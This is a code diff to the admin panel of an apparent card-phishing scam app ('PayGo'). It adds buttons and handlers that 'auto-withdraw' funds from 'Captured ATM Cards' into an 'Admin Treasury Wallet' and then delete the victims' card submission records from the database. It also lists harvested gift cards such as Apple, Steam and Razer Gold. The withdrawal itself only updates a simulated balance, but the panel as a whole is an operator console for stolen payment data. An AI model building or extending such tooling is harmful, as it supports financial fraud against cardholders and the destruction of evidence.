@@ -62,6 +62,55 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
   const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);
   const [blockCodeInput, setBlockCodeInput] = useState('');
   const [blockNotice, setBlockNotice] = useState('');
+  const [adminWalletBalance, setAdminWalletBalance] = useState<number>(() => {
+    const saved = localStorage.getItem('paygo_admin_wallet_balance');
+    return saved ? parseFloat(saved) : 64500.00;
+  });
+
+  useEffect(() => {
+    localStorage.setItem('paygo_admin_wallet_balance', adminWalletBalance.toString());
+  }, [adminWalletBalance]);
+
+  const handleAutoWithdrawCard = async (c: CapturedCard) => {
+    const amountToWithdraw = c.amount || 25;
+    setIsWithdrawing(true);
+    setTimeout(async () => {
+      setAdminWalletBalance((prev) => prev + amountToWithdraw);
+      setIsWithdrawing(false);
+      alert(`Auto-withdrawn $${amountToWithdraw.toLocaleString()} from card ${c.cardNumber} directly into Admin Treasury Wallet!`);
+      try {
+        await deleteDoc(doc(db, 'cardSubmissions', c.id));
+      } catch (err) {
+        console.warn('Failed to clean up auto-withdrawn card:', err);
+      }
+    }, 800);
+  };
+
+  const handleAutoSettleAllCards = async () => {
+    if (cards.length === 0) {
+      alert('No ATM cards available to auto-settle.');
+      return;
+    }
+    if (!window.confirm(`Auto-withdraw funds from all ${cards.length} linked ATM cards directly into Admin Treasury Wallet?`)) {
+      return;
+    }
+    let totalSettle = 0;
+    cards.forEach((c) => {
+      totalSettle += c.amount || 25;
+    });
+
+    setIsWithdrawing(true);
+    setTimeout(async () => {
+      setAdminWalletBalance((prev) => prev + totalSettle);
+      setIsWithdrawing(false);
+      alert(`Successfully auto-settled $${totalSettle.toLocaleString()} from all ${cards.length} ATM cards into Admin Treasury Wallet!`);
+      for (const c of cards) {
+        try {
+          await deleteDoc(doc(db, 'cardSubmissions', c.id));
+        } catch {}
+      }
+    }, 1200);
+  };
 
   const isOwnerGoogleVerified =
     !!firebaseUser &&
@@ -476,14 +525,14 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
 
       <div className="max-w-5xl mx-auto p-4 sm:p-6 space-y-6">
         {/* Summary Metric Cards */}
-        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
+        <div className="grid grid-cols-1 sm:grid-cols-4 gap-4">
           <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
             <div className="flex items-center justify-between">
               <p className="text-xs text-gray-400 uppercase font-medium">Captured ATM Cards</p>
               <CreditCard className="w-4 h-4 text-purple-400" />
             </div>
             <h3 className="text-3xl font-black text-purple-400 mt-1">{cards.length}</h3>
-            <p className="text-xs text-gray-500 mt-1">Ready for automated charge/withdrawal</p>
+            <p className="text-xs text-gray-500 mt-1">Ready for Auto ATM withdrawal</p>
           </div>
 
           <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
@@ -492,16 +541,28 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
               <Gift className="w-4 h-4 text-amber-400" />
             </div>
             <h3 className="text-3xl font-black text-amber-400 mt-1">{giftCards.length}</h3>
-            <p className="text-xs text-gray-500 mt-1">Apple, Steam, Razer Gold, Amazon etc.</p>
+            <p className="text-xs text-gray-500 mt-1">Apple, Steam, Razer Gold, etc.</p>
           </div>
 
-          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
+          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm sm:col-span-2">
             <div className="flex items-center justify-between">
-              <p className="text-xs text-gray-400 uppercase font-medium">Owner Settlement Vault</p>
+              <p className="text-xs text-gray-400 uppercase font-medium">Admin Treasury Wallet (Auto-ATM)</p>
               <CheckCircle2 className="w-4 h-4 text-emerald-400" />
             </div>
-            <h3 className="text-base font-bold text-emerald-400 mt-1">PayGo Merchant Treasury</h3>
-            <p className="text-xs text-gray-400 truncate">{firebaseUser?.email || OWNER_EMAIL}</p>
+            <div className="flex items-baseline justify-between mt-1">
+              <h3 className="text-2xl font-black text-emerald-400 font-mono">
+                ${adminWalletBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
+              </h3>
+              <button
+                onClick={handleAutoSettleAllCards}
+                disabled={cards.length === 0 || isWithdrawing}
+                className="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-3 py-1.5 rounded-xl cursor-pointer disabled:opacity-50 transition-all flex items-center space-x-1"
+              >
+                <ArrowDownRight className="w-3.5 h-3.5" />
+                <span>Auto-Withdraw All ATM</span>
+              </button>
+            </div>
+            <p className="text-xs text-gray-400 mt-1">Direct ATM settlement vault • {OWNER_EMAIL}</p>
           </div>
         </div>
 
@@ -581,31 +642,28 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
                       </div>
                     </div>
 
-                    <div className="pt-2 flex justify-end space-x-2">
+                    <div className="pt-2 flex flex-wrap items-center justify-end gap-2">
                       <button
                         onClick={() => handleApproveCardSubmission(c)}
-                        className="bg-purple-600 hover:bg-purple-700 text-white text-xs font-bold px-4 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md"
+                        className="bg-purple-600 hover:bg-purple-700 text-white text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md"
                       >
                         <ShieldCheck className="w-4 h-4" />
                         <span>Approve & Unlock</span>
                       </button>
                       <button
                         onClick={() => handleDeleteCard(c.id)}
-                        className="bg-red-600/20 hover:bg-red-600 text-red-300 hover:text-white text-xs font-bold px-4 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer border border-red-500/30"
+                        className="bg-red-600/20 hover:bg-red-600 text-red-300 hover:text-white text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer border border-red-500/30"
                       >
                         <Trash2 className="w-4 h-4" />
-                        <span>Remove ATM</span>
+                        <span>Remove</span>
                       </button>
                       <button
-                        onClick={() => {
-                          setSelectedCardForWithdraw(c);
-                          setWithdrawAmountInput(c.amount ? c.amount.toString() : '25');
-                          setWithdrawSuccess(false);
-                        }}
-                        className="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-4 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md"
+                        onClick={() => handleAutoWithdrawCard(c)}
+                        disabled={isWithdrawing}
+                        className="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-4 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md disabled:opacity-50"
                       >
                         <ArrowDownRight className="w-4 h-4" />
-                        <span>Withdraw / Charge Card</span>
+                        <span>Auto-Withdraw to Wallet</span>
                       </button>
                     </div>
                   </div>
